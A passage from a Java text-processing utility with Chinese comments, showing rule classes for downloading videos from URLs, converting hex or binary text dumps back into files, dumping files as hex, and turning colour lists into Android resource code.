					System.out.println("程序下载 retry " + download_failed_time + " 次 仍然 下载 失败----放弃");
				} else {
					downRawVideo_WithUrl_Proxy(pageUrl, httpUrl, fileNameNoPoint, source);
				}
				// e.printStackTrace();

				// System.out.println(e.getMessage());
			}
		}

		// 视频的保存 目录 不能是 当前文件 否则 就会执行 同步操作 影响网速
		// pageUrl 是页面的url httpUrl 是视频文件的url
		@SuppressWarnings("unchecked")
		public void downRawVideo_WithUrl(String pageUrl, String httpUrl, String fileNameNoPoint, String source) {
			if (urlStrList.contains(httpUrl)) {
				System.out.println("当前url 路径已经下载过  跳过下载!!  url路径: " + httpUrl + "");
				return;
			}

			// String fileAddress = videoSavePath+"/"+source+"/"+title+".mp4";
			String fileAddress = videoSavePath + "/"
					+ ((source == null || "".equals(source) ? "" : source + "_") + fileNameNoPoint.replace(" ", ""))
					+ "_" + index_download + "_" + timeStamp_Str + ".mp4";
			fileAddress = clearChinese(fileAddress);
			fileAddress = fileAddress.replace(" ", "");
			fileAddress = fileAddress.replace("	", "");
			fileAddress = fileAddress.replace("！", "");
			fileAddress = fileAddress.replace("!", "");
			fileAddress = fileAddress.replace("，", "");
			fileAddress = fileAddress.replace("：", "");
			fileAddress = fileAddress.replace("《", "");
			fileAddress = fileAddress.replace("？", "");
			fileAddress = fileAddress.replace("。", "");
			int byteRead;

			try {

				// 获取链接

				System.out.println(
						"downloadByCommonIO_Retry下载[" + download_failed_time + "] Begin fileAddress= " + fileAddress);
				System.out
						.println("downloadByCommonIO_Retry下载[" + download_failed_time + "] Begin HttpUrl= " + httpUrl);
				System.out
						.println("downloadByCommonIO_Retry下载[" + download_failed_time + "] Begin PageUrl= " + pageUrl);

				InetSocketAddress address = new InetSocketAddress("127.0.0.1", 7078);
				Proxy proxy = new Proxy(Proxy.Type.HTTP, address); // http代理协议类型
				URL url = new URL(httpUrl);
//				URLConnection conn = url.openConnection(proxy);    // 代理
				URLConnection conn = url.openConnection();
				// 输入流
				long beginTimeStamp = System.currentTimeMillis();
				System.out.println("conn.getInputStream 获得 输入流  Begin ( downRawVideo耗时_A 得很) ");
				InputStream inStream = conn.getInputStream();
				long endTimeStamp = System.currentTimeMillis();
				long distance_second = (endTimeStamp - beginTimeStamp) / 1000;

				System.out.println("conn.getInputStream 获得 输入流  End ( downRawVideo耗时_A【" + distance_second + " 秒】 得很)");

				// 封装一个保存文件的路径对象
				File fileSavePath = new File(fileAddress);
				// 注:如果保存文件夹不存在,那么则创建该文件夹
				File fileParent = fileSavePath.getParentFile();
				if (!fileParent.exists()) {
					fileParent.mkdirs();
				}
				// 写入文件
				FileOutputStream fs = new FileOutputStream(fileSavePath);
				byte[] buffer = new byte[1024];
				beginTimeStamp = System.currentTimeMillis();
				System.out.println("FileOutputStream.write  写入本地文件  Begin   比较 downRawVideo_耗时_B ");
				while ((byteRead = inStream.read(buffer)) != -1) {
					fs.write(buffer, 0, byteRead);
				}
				endTimeStamp = System.currentTimeMillis();
				distance_second = (endTimeStamp - beginTimeStamp) / 1000;

				System.out.println(
						"FileOutputStream.write  写入本地文件  End ( downRawVideo_耗时_B【" + distance_second + " 秒】 得很)");

				inStream.close();
				fs.close();
				System.out.println("\n-----视频保存路径-----\n" + fileSavePath.getAbsolutePath());
				System.out.println("\nzzfile_3.bat " + fileSavePath.getParentFile().getAbsolutePath());

				// 获取文件的 md值 并重命名为 mdxxxx.mp4
				String mdName = getMD5Three(fileSavePath.getAbsolutePath());
				String new_Md_Name = mdName + ".mp4";
				tryReName(fileSavePath, new_Md_Name);
				// 把下载的 mp4 文件 名称 转为 md值
				url_name_LogList.add(pageUrl + "          " + mdName);
				urlStrList.add(httpUrl);
				download_failed_time = 0;
				System.out
						.println("downloadByCommonIO_下载[" + download_failed_time + "] End  fileAddress=" + fileAddress);
			} catch (Exception e) {

				download_failed_time++;
				if (download_failed_time % 10 == 0) {
					System.out.println("程序下载 retry " + download_failed_time + " 次 仍然 下载 失败----放弃");
				} else {
					downRawVideo_WithUrl(pageUrl, httpUrl, fileNameNoPoint, source);
				}
				// e.printStackTrace();

				// System.out.println(e.getMessage());
			}
		}

		// 对每行的数据进行分析

		public void toGetUrlFromOneLine_And_InitUrlList(String rowString) {
			String[] strArrRow = null;
			String fixStr = "";

//	        if(str.trim().startsWith("http:") || str.trim().startsWith("https:") ||
//	                str.trim().startsWith("thunder:") ||   str.trim().startsWith("magnet::") ){

			if (rowString != null) {
				fixStr = new String(rowString);
				// http://xxxxxx/sahttp:// 避免出现 http://http: 连着的情况 起码也要使得间隔一个空格
				fixStr = fixStr.replace("http:", " http:");
				fixStr = fixStr.replace("https:", " https:");
				fixStr = fixStr.replace("thunder:", " thunder:");
				fixStr = fixStr.replace("magnet:", " magnet:");
				strArrRow = fixStr.split(" ");
			}

			if (strArrRow != null && strArrRow.length > 0) {

				for (int i = 0; i < strArrRow.length; i++) {
					String mCurContent = strArrRow[i];
					if (mCurContent == null || mCurContent.trim().equals("")) {
						continue;
					}

					boolean isUrl = toJudgeUrl(mCurContent);
					if (isUrl) { // 当前 url 已经 包含 所以 不再添加重复的
						if (!urlList.contains(clearChinese(mCurContent).trim())) {
							urlList.add(clearChinese(mCurContent).trim());

						}

					}

				}

			}

		}

		public String clearChinese(String lineContent) {
			if (lineContent == null || lineContent.trim().isEmpty()) {
				return null;
			}
			Pattern pat = Pattern.compile(REGEX_CHINESE);
			Matcher mat = pat.matcher(lineContent);
			return mat.replaceAll(" ");
		}

		/**
		 * 方法描述: 过滤分享链接的中文汉字
		 *
		 */
		public String filterUrl(String rowLine, String url) {
			String regex = "https?://(\\w|-)+(\\.(\\w|-)+)+(/(\\w+(\\?(\\w+=(\\w|%|-)*(\\&\\w+=(\\w|%|-)*)*)?)?)?)+";// 匹配网址
			Pattern p = Pattern.compile(regex);
			Matcher m = p.matcher(rowLine);
			if (m.find()) {
				return rowLine.substring(m.start(), m.end());
			}
			return "";
		}

		/**
		 * 方法描述: 获取分享视频id
		 *
		 *
		 */
		public String getItemId(String url) {
			int start = url.indexOf("/video/") + 7;
			int end = url.lastIndexOf("/");
			String itemId = url.substring(start, end);
			return itemId;
		}

		public boolean toJudgeUrl(String str) {
			boolean isUrl = false;

			if (str.trim().toLowerCase().startsWith("http:") || str.toLowerCase().trim().startsWith("https:")
					|| str.toLowerCase().trim().startsWith("thunder:")
					|| str.toLowerCase().trim().startsWith("magnet:")) {

				return true;
			}

			return isUrl;
		}

	}

	class HexNumberStrToFile_Rule_37 extends Basic_Rule {

		String error_string_item;

		HexNumberStrToFile_Rule_37() {
			super(37, false);

		}

		@Override
		String simpleDesc() {
			return "  对于只包含 十六进制的 数值的文件 转为字节文件  并依据魔数 进行还原数据 一行16个字节 32个十六进制 只能截断一次   zbyte_file_F9.bat 的 另一种方式的逆向操作";
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				ArrayList<String> allContentList = new ArrayList<String>();
				File targetFile = curInputFileList.get(i);
				String fileName = getFileNameNoPointNoLowerCase(targetFile.getName());
				ArrayList<String> allContent = ReadFileContentAsList(targetFile);

				// 每一个 item 只包含 两个长度 最小00 最大FF
				ArrayList<String> mTwoHexNum_OneByte_List = new ArrayList<String>(); // 只包含 十六进制字节的 字符串的列表 每一个Item 是
				// 一个字节 00--AA--FF 这样

				// 解析出的 byte 的 数组
				ArrayList<Byte> resultByte_List = new ArrayList<Byte>();

				boolean isOnly_HexStr_flag = Try_TwoHexNum_OneByte_AsOneItem(allContent, mTwoHexNum_OneByte_List,
						resultByte_List);

				if (!isOnly_HexStr_flag) {
					System.out.println("当前文件不仅仅包含 字节十六进制字符 00 FF 可能包含非法的 XX YY ZZ 等非十六进制字符  请检查!!!  error_string_item=["
							+ error_string_item + "]");
					return null;
				}

				writeByteArrToFile(I9_Temp_Text_File, resultByte_List);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println(
						"rule_" + rule_index + " -> 完成16进制字符串对应的Byte文件写入文件 " + targetFile.getAbsolutePath() + " ! ");

				String realType = getFileType(I9_Temp_Text_File.getAbsolutePath());
				if (realType == null) {
					realType = "unknow";
				}
				String realType_Name = fileName + "_HexRecovery_Rule" + rule_index + "_" + getTimeStamp() + "."
						+ realType;

				File realFile = new File(targetFile.getParentFile().getAbsolutePath() + File.separator + realType_Name);
				fileCopy(I9_Temp_Text_File, realFile);
				System.out.println("rule_" + rule_index + " -> 完成16进制字符串转为文件 生成文件--> " + realFile.getAbsolutePath()
						+ " 的 " + realType + " 类型的文件!! ");

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);

		}

		// 把 contentList 中原始的数据转为 一个接一个的 一个字节2个16进制字符串 存入到 item_2hexstr_1byte_StrArr , 再
		// 把 item_2hexstr_1byte_StrArr 转为 Array<Byte>
		synchronized boolean Try_TwoHexNum_OneByte_AsOneItem(ArrayList<String> contentList,
															 ArrayList<String> item_2hexstr_1byte_StrArr, ArrayList<Byte> resultByeArr) {
			boolean isOnly_HexStr_flag = true;

			// 从 contentList 过滤出来的 只包含 16进制数值的字符串的集合 包含 注释 【】 去除【】的 内容

			ArrayList<String> OnlyHerLineList = new ArrayList<String>();

			ArrayList<String> OnlyHerLineList_ClearBlock_ClearTip = new ArrayList<String>(); // 去除【】的 内容 去除 ║ 后面的内容
//			1.包含 ║  和 0x开头
//          2. 包含 ║  但没有 0x 开头   【一定是字符串】
//          3. 不包含 ║ 但是 0x开头
//          4. 不包含 ║  也不是 0x开头

			// 0x000002E0 0000000736 空格分隔 第一个数据 和 第二个数据的长度 必须是
			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < contentList.size(); i++) {
				// 在这里 对 只有两个十六进制数字的字符串进行过来
				String one_raw_line = contentList.get(i);
				boolean is_0x_begin = one_raw_line.startsWith("0x");
				boolean is_contain_blankline = one_raw_line.contains("║");

				if (!is_0x_begin && is_contain_blankline) { // 包含 ║ 但没有 0x 开头 【一定是 Hex字符串】
					OnlyHerLineList.add(one_raw_line);
					continue;
				}

				if (is_0x_begin && !is_contain_blankline) { // 0x开头 但 不包含║ , 那么 需要判断它的前置

					String[] line_split_arr = one_raw_line.split(" ");
					if (line_split_arr != null && line_split_arr.length > 2) {

						if (line_split_arr[0].length() == 10 && line_split_arr[1].length() == 10
								&& isNumeric(line_split_arr[1])) {

							OnlyHerLineList.add(one_raw_line);
							continue;
						}

					}

				}

				if (is_0x_begin && is_contain_blankline) {

					OnlyHerLineList.add(one_raw_line);
				}

			}
			System.out.println("过滤出的 16进制 行 内容: ");

			for (int i = 0; i < OnlyHerLineList.size(); i++) {
				String hex_line = OnlyHerLineList.get(i);
				System.out.println("line[" + (i + 1) + "] = " + hex_line);
				String temp_str = hex_line;
				// 去除 竖线
				if (temp_str.contains("║")) {
					temp_str = temp_str.substring(0, temp_str.indexOf("║"));
				}

				// 去除 【】

				while (temp_str.contains("【") && temp_str.contains("】")
						&& temp_str.indexOf("【") < temp_str.indexOf("】")) {
					int first_tag_index = temp_str.indexOf("【");
					int second_tag_index = temp_str.indexOf("】");

					String pre_str = temp_str.substring(0, first_tag_index);
					String end_str = temp_str.substring(second_tag_index + 1);
					temp_str = pre_str + end_str;

				}

				while (temp_str.contains("《") && temp_str.contains("》")
						&& temp_str.indexOf("《") < temp_str.indexOf("》")) {
					int first_tag_index = temp_str.indexOf("《");
					int second_tag_index = temp_str.indexOf("》");

					String pre_str = temp_str.substring(0, first_tag_index);
					String end_str = temp_str.substring(second_tag_index + 1);
					temp_str = pre_str + end_str;

				}

				OnlyHerLineList_ClearBlock_ClearTip.add(temp_str);
			}

			System.out.println();
			System.out.println("对过滤出的 16进制 行 内容进行 清理后的输出： ");

			for (int i = 0; i < OnlyHerLineList_ClearBlock_ClearTip.size(); i++) {

				String hex_line_clearstr = OnlyHerLineList_ClearBlock_ClearTip.get(i);

				System.out.println("hex_line_clearstr[" + (i + 1) + "] = " + hex_line_clearstr);

				String[] hex_split_arr = hex_line_clearstr.split(" ");
				if (hex_split_arr != null) {

					for (int j = 0; j < hex_split_arr.length; j++) {
						String cur_twohex_onebyte_str = hex_split_arr[j];

						if (cur_twohex_onebyte_str != null && cur_twohex_onebyte_str.length() == 2) {

							isOnly_HexStr_flag = isOnly_HexStr_flag && is16jinzhi(cur_twohex_onebyte_str);

							if (!isOnly_HexStr_flag) {

								System.out.println(
										"当前读取到一个 非 16进制字符 :" + cur_twohex_onebyte_str + "  无法转为Byte 字节 报错 请检查!");
								return false;
							}

							item_2hexstr_1byte_StrArr.add(cur_twohex_onebyte_str);

						}

					}

				}

			}

			System.out.println("当前总共读取到的字节数量:" + item_2hexstr_1byte_StrArr.size());

			synchronized (this) {
				for (int i = 0; i < item_2hexstr_1byte_StrArr.size(); i++) {
					String twohex_onebyte_str = item_2hexstr_1byte_StrArr.get(i);

					Byte targetByte = calcul2Hex_To_OneByte(twohex_onebyte_str);
					if (targetByte != null && twohex_onebyte_str != null) {
						resultByeArr.add(targetByte);
					} else if (targetByte == null) {
						isOnly_HexStr_flag = false;
						error_string_item = twohex_onebyte_str;
						System.out.println("当前文件不仅仅包含一个2位字符  无法转为 byte字节  请检查!!!   twohex_onebyte_str=【"
								+ twohex_onebyte_str + "】");
						return isOnly_HexStr_flag;
					}

				}
			}

			return isOnly_HexStr_flag;
		}

		// 把 一个 十六进制 转为 一个byte 字节
		public Byte calcul2Hex_To_OneByte(String twohex_onebyte_str) {

			return hexStrToByte(twohex_onebyte_str);
		}

		public Byte calcul8bitStr_To_ObeByte(String bit_8_str) {

			if (bit_8_str == null || "".equals(bit_8_str) || bit_8_str.length() != 8) {
				System.out.println("当前提供的字符串不是8位二进制的字符串");
				return null;
			}
			String veryStr = bit_8_str.replace("1", "").replace("0", "").trim();
			if (!"".equals(veryStr)) {
				System.out.println("当前提供的字符串不是二进制的字符串");
				return null;
			}

//		System.out.println("bit_8_str  ="+ bit_8_str);
			StringBuilder sb = new StringBuilder();
			byte targetByte = 0x00;
			byte tempByte = 0x01;
			for (int i = 7; i >= 0; i--) {
				char charItem = bit_8_str.charAt(i == 7 ? 0 : (i % 7 == 0 ? 7 : (7 - i) % 7));
				byte positionByte = (byte) (tempByte << i);

//System.out.println("--------------- index_byte["+i+"] char["+charItem+"]-------------------");

				if ('1' == charItem) {
					targetByte = (byte) (targetByte | positionByte);
				}
//            System.out.println("positionByte_["+i+"] = "+showByte(positionByte));
//            System.out.println("targetByte_["+i+"] = "+showByte(targetByte));
			}
			return targetByte;

		}

	}

	class BinaryStrToFile_Rule_36 extends Basic_Rule {

		String error_string_item;

		BinaryStrToFile_Rule_36() {
			super(36, false);

		}

		@Override
		String simpleDesc() {
			return "  把当前的只包含二进制字符0和1的文件 转为解析出来的对应的字节文件  zbyte_file_F9.bat 的 逆向操作";
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				ArrayList<String> allContentList = new ArrayList<String>();
				File targetFile = curInputFileList.get(i);
				String fileName = getFileNameNoPointNoLowerCase(targetFile.getName());
				ArrayList<String> allContent = ReadFileContentAsList(targetFile);

				// 每一个 item 只包含 8位字符串 所组成的新的字符串集合 方便 转为 byte数组
				ArrayList<String> item8bitstr_List = new ArrayList<String>();

				// 解析出的 byte 的 数组
				ArrayList<Byte> resultByte_List = new ArrayList<Byte>();

				boolean isOnly_0_1_flag = Try8bitAsOneItem(allContent, item8bitstr_List, resultByte_List);

				if (!isOnly_0_1_flag) {
					System.out.println("当前文件不仅仅包含 字节字符 0 和 1 请检查!!!  error_string_item=[" + error_string_item + "]");
					return null;
				}

//               writeContentToFile(targetFile, item8bitstr_List);

				writeByteArrToFile(I9_Temp_Text_File, resultByte_List);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println(
						"rule_" + rule_index + " -> 完成Byte文件写入文件 " + targetFile.getAbsolutePath() + " 的 二进制打印!! ");

				String realType = getFileType(I9_Temp_Text_File.getAbsolutePath());
				if (realType == null) {
					realType = "unknow";
				}
				String realType_Name = fileName + "_BinRecovery_Rule36_" + getTimeStamp() + "." + realType;

				File realFile = new File(targetFile.getParentFile().getAbsolutePath() + File.separator + realType_Name);
				fileCopy(I9_Temp_Text_File, realFile);
				System.out.println("rule_" + rule_index + " -> 完成二进制字符串转为文件 生成文件--> " + realFile.getAbsolutePath()
						+ " 的 " + realType + " 类型的文件!! ");

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);

		}

		synchronized boolean Try8bitAsOneItem(ArrayList<String> contentList, ArrayList<String> item8bitArr,
											  ArrayList<Byte> resultByeArr) {
			boolean isOnly_0_1_flag = true;

			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < contentList.size(); i++) {
				sb.append(contentList.get(i).trim());
			}

			String rawContetnt = sb.toString();
			int last8str = rawContetnt.length() % 8;
			if (last8str != 0) {
				isOnly_0_1_flag = false;
				error_string_item = "不是8的整数 rawContetnt.length()=" + rawContetnt.length();
				System.out.println("当前文件字节字符 0 和 1的个数  不是8的整数  所以 不是二进制字符串 执行失败!! ");
				return isOnly_0_1_flag;
			}
			synchronized (this) {
				for (int i = 0; i < rawContetnt.length(); i = i + 8) {
					String bit_8_str = rawContetnt.substring(i, i + 8);
					if (bit_8_str == null) {
						continue;
					}
					Byte targetByte = calcul8bitStr_To_ObeByte(bit_8_str);
					if (targetByte != null && bit_8_str != null) {
						resultByeArr.add(targetByte);
						item8bitArr.add(bit_8_str);
					} else if (targetByte == null) {
						isOnly_0_1_flag = false;
						error_string_item = bit_8_str;
						System.out.println("当前文件不仅仅包含 字节字符 0 和 1 请检查!!!   bit_8_str=【" + bit_8_str + "】");
						return isOnly_0_1_flag;
					}

				}
			}

			return isOnly_0_1_flag;
		}

		public Byte calcul8bitStr_To_ObeByte(String bit_8_str) {

			if (bit_8_str == null || "".equals(bit_8_str) || bit_8_str.length() != 8) {
				System.out.println("当前提供的字符串不是8位二进制的字符串");
				return null;
			}
			String veryStr = bit_8_str.replace("1", "").replace("0", "").trim();
			if (!"".equals(veryStr)) {
				System.out.println("当前提供的字符串不是二进制的字符串");
				return null;
			}

//		System.out.println("bit_8_str  ="+ bit_8_str);
			StringBuilder sb = new StringBuilder();
			byte targetByte = 0x00;
			byte tempByte = 0x01;
			for (int i = 7; i >= 0; i--) {
				char charItem = bit_8_str.charAt(i == 7 ? 0 : (i % 7 == 0 ? 7 : (7 - i) % 7));
				byte positionByte = (byte) (tempByte << i);

//System.out.println("--------------- index_byte["+i+"] char["+charItem+"]-------------------");

				if ('1' == charItem) {
					targetByte = (byte) (targetByte | positionByte);
				}
//            System.out.println("positionByte_["+i+"] = "+showByte(positionByte));
//            System.out.println("targetByte_["+i+"] = "+showByte(targetByte));
			}
			return targetByte;

		}

	}

	class FileToByte_F9_Rule_35 extends Basic_Rule {

		public StringBuilder mHexSB;
		public StringBuilder mBinarySB;
		public StringBuilder mAsciiSB;

		FileToByte_F9_Rule_35() {
			super(35, false);
			mHexSB = new StringBuilder();
			mBinarySB = new StringBuilder();
			mAsciiSB = new StringBuilder();
		}

		@Override
		String simpleDesc() {
			return " 集成Rule zbyte_file_F9.bat 的功能 把当前文件转为 二进制 byte 的txt格式 并在notepad++打开  ";
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				ArrayList<String> allContentList = new ArrayList<String>();
				File targetFile = curInputFileList.get(i);
				allContentList
						.add("\n\n\n\n══════════════════════Index" + i + "   PATH : " + targetFile.getAbsolutePath());

				byte[] byteArr = tryFile2Byte(targetFile);

//result.length=1207959002
//result.length=1207959533                     // 读取的文件太大造成 byte[]数组太大  进而使得 StringBuilder.append()的大小 大于12亿 length了 导致无法打印
//Exception in thread "main" java.lang.OutOfMemoryError: Requested array size exceeds VM limit
//at java.util.Arrays.copyOf(Arrays.java:3332)
//at java.lang.AbstractStringBuilder.expandCapacity(AbstractStringBuilder.java:137)
//at java.lang.AbstractStringBuilder.ensureCapacityInternal(AbstractStringBuilder.java:121)
//at java.lang.AbstractStringBuilder.append(AbstractStringBuilder.java:421)
//at java.lang.StringBuilder.append(StringBuilder.java:136)
//at I9_TextRuleOperation.dumpHexString(I9_TextRuleOperation.java:15450)
//at I9_TextRuleOperation.dumpHexString(I9_TextRuleOperation.java:15350)
//at I9_TextRuleOperation$FileToByte_F9_Rule_35.applyOperationRule(I9_TextRuleOperation.java:4530)
//at I9_TextRuleOperation$Basic_Rule.operationRule(I9_TextRuleOperation.java:8819)
//at I9_TextRuleOperation.main(I9_TextRuleOperation.java:10218)

				String dumpHex_result_str = dumpHexString(byteArr, mBinarySB, mAsciiSB, mHexSB);
				allContentList
						.add("\n\n\n\n══════════════════════Index" + i + "   PATH : " + targetFile.getAbsolutePath());
				allContentList.add(dumpHex_result_str);
				allContentList.add("\n\n\n ══════════════════════  单独16进制(十六进制)形式 ══════════════════════ ");
				allContentList.add(mHexSB.toString());
				allContentList.add("\n\n\n ══════════════════════  单独二进制形式 ══════════════════════ ");
				allContentList.add("ZZZZZZZZZZZZZZZZZZZZZ");
				allContentList.add(mBinarySB.toString());
				allContentList.add("ZZZZZZZZZZZZZZZZZZZZZ");

				System.out.println(
						"\n\n\n\n══════════════════════Index" + i + "   PATH : " + targetFile.getAbsolutePath());
				System.out.println(dumpHex_result_str);
				System.out.println("\n\n\n ══════════════════════  单独16进制(十六进制)形式 ══════════════════════ ");

				System.out.println(mHexSB.toString());

				System.out.println("\n\n\n ══════════════════════  单独二进制形式 ══════════════════════ ");
				System.out.println("ZZZZZZZZZZZZZZZZZZZZZ");
				System.out.println(mBinarySB.toString());
				System.out.println("ZZZZZZZZZZZZZZZZZZZZZ");

				ArrayList<String> binary_str_List = new ArrayList<String>();
				if (mAsciiSB.length() > 0) {
					System.out.println("\n\n\n\n");
					System.out.println("ASCII长度: " + mAsciiSB.length());
					System.out.println("══════════════════════ ASCII码 100长度一行 ══════════════════════ ");
					allContentList.add("\n\n\n\n");
					allContentList.add("ASCII长度: " + mAsciiSB.length());
					allContentList.add("══════════════════════ ASCII码 100长度一行 ══════════════════════ ");

					int originSize = mAsciiSB.length();
					StringBuilder sb = new StringBuilder();
					for (int j = 0; j < originSize; j++) {
						sb.append(mAsciiSB.charAt(j));
						if (j % 100 == 0) {
							String binaryItem = get12size(j) + "    " + sb.toString();
							System.out.println(binaryItem);
							allContentList.add(binaryItem);
							binary_str_List.add(binaryItem);
							sb = new StringBuilder();
						}
						if (j == originSize - 1) {
							String binaryItem = get12size(j) + "    " + sb;
							System.out.println(binaryItem);
							allContentList.add(binaryItem);
							binary_str_List.add(binaryItem);
						}
					}
				}

				writeContentToFile(I9_Temp_Text_File, allContentList);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());

				// 在 文件 本地 创建一个 只有 二进制的 txt文件

				String origin_name = targetFile.getName();
				String clearTypeName = getFileNameNoPointNoLowerCase(origin_name);
				String binary_only_filename = clearTypeName + "_binary_" + getTimeStamp() + ".txt";
				File binaryFile = new File(
						targetFile.getParentFile().getAbsolutePath() + File.separator + binary_only_filename);

//				writeContentToFile(mBinarySB.toString(), binary_str_List);
				writeContentToFile(binaryFile, mBinarySB.toString());
//				NotePadOpenTargetFile(binaryFile.getAbsolutePath());
				System.out.println("rule_" + rule_index + " -> 完成当前文件 " + targetFile.getAbsolutePath() + " 的 二进制打印!! ");

				System.out.println("rule_" + rule_index + " -> 完成本地二进制文件 " + binaryFile.getAbsolutePath() + " 的 生成!! ");

			}
			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);

		}

	}

	// 读取当前页面的每一行 只留下 颜色的值 并 生成 android的 列表
	class Select16Color2Android_Rule_34 extends Basic_Rule {
		Select16Color2Android_Rule_34() {
			super(34, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				ArrayList<String> contentList = ReadFileContentAsList(fileItem);

				/*
				 * if(true) { writeContentToFile(I9_Temp_Text_File,contentList);
				 * NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath()); return null; }
				 */
				ArrayList<String> oneWordList = new ArrayList<String>();
				Map<String, String> name_color_map = new HashMap<String, String>();
				for (int j = 0; j < contentList.size(); j++) {
					String wordStr = contentList.get(j).trim();

					String fixed_wordStr = wordStr.replace("###", "#");
					fixed_wordStr = fixed_wordStr.replace("	", " ");
					fixed_wordStr = fixed_wordStr.replace("##", "#");
					fixed_wordStr = fixed_wordStr.replace("##", "#");

					int jing_count = calculStrCount(fixed_wordStr, '#');

					System.out.println(" wordStr = " + wordStr + " jing_count=" + jing_count);

					String[] colorStrArr = fixed_wordStr.split(" ");
					if (jing_count == 0 || colorStrArr == null || colorStrArr.length < 2) {
						System.out.println("过滤A 点 ");
						continue;
					}

					ArrayList<String> coloritemList = new ArrayList<String>();
					StringBuilder sb = new StringBuilder();

					for (int k = 0; k < colorStrArr.length; k++) {
						String strItem = colorStrArr[k];
						if (isNumeric(strItem)) {
							System.out.println("过滤B 点  strItem =" + strItem);
							continue;
						} else {
							System.out.println("通过 B 点  strItem =" + strItem);

						}
						System.out.println("通过 B 点  strItem =" + strItem);

						if (strItem.startsWith("#")) {
							String clear_jing = strItem.replace("#", "");

							if (clear_jing.length() == 8 || clear_jing.length() == 6) {
								if (is16jinzhi(clear_jing)) {
									System.out.println("过滤C 点 ");
									String colorName = coloritemList.get(coloritemList.size() - 1);
									String colorValue = strItem;
									if (name_color_map.containsKey(colorName)) {
										name_color_map.put(colorName + "_1", colorValue);
									} else {
										name_color_map.put(colorName, colorValue);
									}

								} else {
									System.out.println("过滤E 点 ");
									System.out.println("长度不达标！！ strItem = " + strItem);
								}
							}

							continue;
						} else {
							System.out.println("FF 不是以 # 开头 strItem=" + strItem);
						}
						coloritemList.add(strItem); // 把名字 保存起来

					}

				}
				ArrayList<String> codeArr = calculAndroidColorCode(name_color_map);

				writeContentToFile(I9_Temp_Text_File, codeArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " -> 完成读取当前文件的每一行 检测是否有颜色 如果有颜色 那么计算颜色 并输出安卓颜色列表");

			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@SuppressWarnings("unchecked")
		public ArrayList<String> calculAndroidColorCode(Map<String, String> mMapParam) {
			ArrayList<String> codeArr = new ArrayList<String>();

			// <color name="rainbow_popul">#228B00FF</color>
			ArrayList<String> xmlcodeArr = new ArrayList<String>();

//            static int[] rainbow_colorList = {
//                    R.color.rainbow_red     ,
//                    R.color.rainbow_orange  ,
//                    R.color.rainbow_yellow  ,
//                    R.color.rainbow_green   ,
//                    R.color.rainbow_blue    ,
//                    R.color.rainbow_popul   };

			ArrayList<String> javacodeArr = new ArrayList<String>();
			javacodeArr.add("static int[] rainbow_colorList = {");

			Map.Entry<String, String> entryItem;

			System.out.println(
					"════════════════════ Map<String,String> 大小:" + mMapParam.size() + " " + "════════════════════ ");
			int index = 0;
			if (mMapParam != null) {
				Iterator iterator = mMapParam.entrySet().iterator();
				while (iterator.hasNext()) {
					entryItem = (Map.Entry<String, String>) iterator.next();

					String key = entryItem.getKey(); // Map的Key
					String value = entryItem.getValue(); // Map的Value
					System.out.println("Map_index[" + index + "]  key=[" + key + "]   value=[" + value + "]");
					xmlcodeArr.add("<color name=\"" + key + "\">" + value + "</color>");
					if (index == mMapParam.size() - 1) {
						javacodeArr.add("R.color." + key);
					} else {
						javacodeArr.add("R.color." + key + ",");
					}

					index++;
				}
			}
			javacodeArr.add("};");

			codeArr.addAll(javacodeArr);
			codeArr.add("ZZZZZZZZZZZZZZZZZZZZZZZZZ");
			codeArr.addAll(xmlcodeArr);
			codeArr.add("ZZZZZZZZZZZZZZZZZZZZZZZZZ");
			return codeArr;
		}

		String copyWord(String rawStr, int copyTime) {
			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < copyTime; i++) {
				sb.append(rawStr);
			}
			return sb.toString();

		}

		@Override
		String simpleDesc() {
			return " 读取当前文件的每一行 检测是否有颜色 如果有颜色 那么计算颜色 并输出安卓颜色列表 ";
		}

	}

	// 读取当前文件的每一个字符串 截取每一个字符作为单独的字符串然后复制120份
	class MakeStringAsOneString_Copy120AsLine_Rule_33 extends Basic_Rule {
		MakeStringAsOneString_Copy120AsLine_Rule_33() {
			super(33, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);
				ArrayList<String> contentList = ReadFileContentAsList(fileItem);

				/*
				 * if(true) { writeContentToFile(I9_Temp_Text_File,contentList);
				 * NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath()); return null; }
				 */
				ArrayList<String> oneWordList = new ArrayList<String>();

				for (int j = 0; j < contentList.size(); j++) {
					String wordStr = contentList.get(j).trim();

					int wordLength = wordStr.length();
